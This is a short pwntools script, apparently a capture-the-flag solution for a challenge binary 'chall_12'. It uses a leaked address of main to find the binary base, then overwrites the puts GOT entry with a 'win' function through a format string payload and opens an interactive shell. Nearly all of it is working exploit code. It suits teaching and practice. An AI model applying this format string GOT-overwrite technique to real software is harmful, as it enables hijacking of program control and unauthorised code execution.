from pwn import *

# Load the binary file and set it as the context
elf = ELF("./chall_12")

# Start the process
p = process('./chall_12')

# Receive until the ':' character to read the prompt
p.recvuntil(b':')

# Receive the leak from the process
leak = p.recv()

# Convert the leaked address to an integer
intleak = int(leak, 16)

# Calculate the base address of the binary
# The base address is the leaked address minus the address of the 'main' function
elf.address = intleak - elf.sym['main']

# Generate the payload using format string vulnerability
# The payload will overwrite the GOT entry for 'puts' with the address of 'win'
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win}, write_size='byte')

# Send the payload to the process
p.sendline(payload)

# Switch to interactive mode to interact with the shell
p.interactive()